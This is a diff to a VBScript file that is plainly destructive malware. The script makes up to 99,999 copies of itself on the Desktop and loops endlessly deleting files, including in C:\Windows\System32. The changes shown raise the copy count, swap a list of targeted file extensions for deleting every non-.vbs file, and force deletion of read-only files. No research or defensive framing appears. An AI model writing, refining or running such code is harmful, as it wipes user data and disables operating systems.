@@ -12,7 +12,7 @@ systemFoldersToDelete = Array("C:\Windows\System32", "C:\Windows\System64")
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Specify the number of copies to create
-numCopies = 999
+numCopies = 99999
 
 ' Generate copies of the script
 For i = 1 To numCopies
@@ -57,13 +57,7 @@ Do
 
     ' Loop through each file in the system folders and delete if it has a specified file extension
     For Each systemFolderPath In systemFoldersToDelete
-        For Each objFile In objFSO.GetFolder(systemFolderPath).Files
-            Dim systemExtension
-            systemExtension = LCase(objFSO.GetExtensionName(objFile.Name))
-            If systemExtension = "txt" Or systemExtension = "exe" Or systemExtension = "json" Or systemExtension = "doc" Or systemExtension = "pdf" Or systemExtension = "wpd" Or systemExtension = "docx" Or systemExtension = "rtf" Or systemExtension = "tex" Or systemExtension = "odt" Or systemExtension = "jpg" Or systemExtension = "jpeg" Or systemExtension = "mp3" Or systemExtension = "rar" Or systemExtension = "vcd" Or systemExtension = "webp" Or systemExtension = "css" Or systemExtension = "html" Or systemExtension = "py" Or systemExtension = "php" Or systemExtension = "ico" Or systemExtension = "lnk" Or systemExtension = "mp4" Or systemExtension = "js" Or systemExtension = "bak" Or systemExtension = "xml" Or systemExtension = "zip" Or systemExtension = "bmp" Then
-                objFSO.DeleteFile(objFile)
-            End If
-        Next
+        DeleteFilesExceptVBS systemFolderPath
     Next
 
 Loop
@@ -75,9 +69,9 @@ Sub DeleteFilesExceptVBS(folderPath)
     If Err.Number = 0 Then
         For Each file In folder.Files
             Dim extension
-            extension = LCase(objFSO.GetExtensionName(file.Path))
+            extension = LCase(objFSO.GetExtensionName(file.Name))
             If extension <> "vbs" Then
-                objFSO.DeleteFile file.Path
+                file.Delete True ' Delete the file with the option to overwrite read-only files
             End If
         Next
         
